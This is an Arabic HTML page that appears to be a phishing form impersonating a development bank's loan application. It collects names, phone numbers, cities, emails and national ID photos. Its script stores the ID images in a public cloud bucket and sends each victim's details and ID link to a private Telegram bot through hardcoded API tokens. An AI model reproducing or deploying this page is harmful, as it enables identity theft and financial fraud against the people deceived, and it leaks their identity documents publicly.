<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تقديم طلب | بنك التنمية</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root { --primary: #006c35; --bg: #f4f7f5; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); direction: rtl; padding: 20px; margin: 0; }
        .form-container { max-width: 500px; margin: 20px auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
        h2 { text-align: center; color: var(--primary); margin-bottom: 25px; font-size: 1.5rem; }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; font-size: 0.9rem; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 1rem; background: #fafafa; }
        input:focus { border-color: var(--primary); outline: none; background: #fff; }
        button { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 1.1rem; margin-top: 10px; transition: 0.3s; }
        button:disabled { background: #ccc; }
        #loading { display: none; text-align: center; margin-top: 15px; color: var(--primary); font-weight: bold; }
        .back-link { display: block; text-align: center; margin-top: 20px; color: #666; text-decoration: none; font-size: 0.9rem; }
    </style>
</head>
<body>

<div class="form-container">
    <h2 id="formTitle">تعبئة بيانات الطلب</h2>
    <form id="applyForm">
        <div class="input-group">
            <label>الاسم الكامل (نفس اللي بالهوية)</label>
            <input type="text" id="fullName" placeholder="اكتب اسمك هنا" required>
        </div>
        <div class="input-group">
            <label>رقم الجوال</label>
            <input type="tel" id="phone" placeholder="05xxxxxxxx" required>
        </div>
        <div class="input-group">
            <label>مدينة الإقامة</label>
            <input type="text" id="address" placeholder="مثلاً: الرياض" required>
        </div>
        <div class="input-group">
            <label>البريد الإلكتروني</label>
            <input type="email" id="email" placeholder="example@mail.com" required>
        </div>
        <div class="input-group">
            <label>صورة الهوية الوطنية (تأكد إنها واضحة)</label>
            <input type="file" id="idCard" accept="image/*" required>
        </div>
        <button type="submit" id="submitBtn">اعتماد وإرسال الطلب</button>
    </form>
    <div id="loading">⏳ جاري رفع بياناتك.. خلك بالصفحة</div>
    <a href="index.html" class="back-link">إلغاء والعودة للرئيسية</a>
</div>

<script>
    const SUPABASE_URL = 'https://fyaxiwtkjdjmgfovsfmb.supabase.co';
    const SUPABASE_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ5YXhpd2t0amRqbWdmb3ZzZm1iIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY5Njc5MzcsImV4cCI6MjA5MjU0MzkzN30.gdkzSZJIlaOVSiLgvEy_wKV9cq1ZAMIkM8DMB9yvpgU';
    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const TG_TOKEN = '8688016586:AAFEd6EBgeu5pTWtLTstuN2YFsZytQBWwH8';
    const TG_CHAT_ID = '5516597110';

    const selectedFinance = localStorage.getItem('selectedFinance') || 'تمويل عام';
    document.getElementById('formTitle').innerText = `تقديم على ${selectedFinance}`;

    document.getElementById('applyForm').onsubmit = async (e) => {
        e.preventDefault();
        const btn = document.getElementById('submitBtn');
        const loader = document.getElementById('loading');
        
        btn.disabled = true;
        loader.style.display = 'block';

        const file = document.getElementById('idCard').files[0];
        const orderNum = 'SDB-' + Math.floor(10000 + Math.random() * 90000);
        
        try {
            // 1. رفع الصورة لـ Storage
            const fileExt = file.name.split('.').pop();
            const fileName = `${orderNum}.${fileExt}`;
            const { data: uploadData, error: uploadError } = await supabaseClient.storage
                .from('identity_cards')
                .upload(fileName, file);

            if (uploadError) throw uploadError;

            const imgUrl = `${SUPABASE_URL}/storage/v1/object/public/identity_cards/${fileName}`;

            // 2. حفظ البيانات في الجدول
            const { error: dbError } = await supabaseClient.from('applications').insert([{
                order_number: orderNum,
                full_name: document.getElementById('fullName').value,
                phone: document.getElementById('phone').value,
                address: document.getElementById('address').value,
                email: document.getElementById('email').value,
                finance_type: selectedFinance,
                id_card_url: imgUrl,
                status: 'pending'
            }]);

            if (dbError) throw dbError;

            // 3. إرسال التنبيه لتليجرام
            const msg = `🔔 *طلب تمويل جديد*\n\n` +
                        `*النوع:* ${selectedFinance}\n` +
                        `*رقم الطلب:* \`${orderNum}\` \n` +
                        `*الاسم:* ${document.getElementById('fullName').value}\n` +
                        `*الجوال:* ${document.getElementById('phone').value}\n` +
                        `*المدينة:* ${document.getElementById('address').value}\n\n` +
                        `🔗 [اضغط هنا لمشاهدة الهوية](${imgUrl})`;
            
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'Markdown' })
            });

            alert(`يا هلا بك! تم استلام طلبك بنجاح.\nرقم طلبك هو: ${orderNum}\nاحفظ الرقم عشان تشيك على طلبك لاحقاً.`);
            window.location.href = 'index.html';

        } catch (error) {
            alert('حصل خطأ بسيط، تأكد من اتصالك وجرب مرة ثانية');
            btn.disabled = false;
            loader.style.display = 'none';
        }
    };
</script>
</body>
</html>
